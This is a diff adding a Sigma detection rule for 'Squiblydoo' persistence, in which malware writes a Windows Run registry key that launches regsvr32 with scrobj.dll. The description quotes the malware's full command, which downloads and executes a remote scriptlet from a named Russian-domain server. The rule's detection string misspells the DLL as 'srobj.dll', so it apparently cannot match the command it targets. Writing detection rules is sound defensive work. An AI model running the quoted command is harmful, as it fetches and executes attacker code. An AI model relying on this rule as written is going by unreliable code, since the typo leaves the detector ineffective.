@@ -1,0 +1,27 @@
+title: Modifying the registry using Scrobj.dll (Squiblydoo Detection)
+description: When the malware runs automatically, the first action it takes is using rundll32.exe to create the path "HKU \ S-1-5-21-742682598-214643559-1648686380-5210 \ Software \ Microsoft \ Windows \ CurrentVersion \ Run \ COM +" in the registry. It throws "regsvr32 / s / n / u /i:http://server1.aserdefa.ru/deploy.xml scrobj.dll". And it goes to http://server1.aserdefa.ru/deploy.xml using "Microsoft © Register Server" at startup.
+author: Furkan Celik
+tags:
+- attack.defense_evasion
+- attack.T1218
+- attack.T1218.010
+date: 2021/02/22
+reference:
+- local
+status: stable
+logsource:
+  product: windows
+  service: registry_event
+detection:
+  condition: selection
+  selection:
+    TargetObject|contains:
+    - Software\Microsoft\Windows\CurrentVersion\Run\
+    - Software\Microsoft\Windows\CurrentVersion\RunOnce\
+    Details|contains|all:
+    - regsvr32
+    - srobj.dll
+fields:
+- TargetObject
+- Details
+level: critical
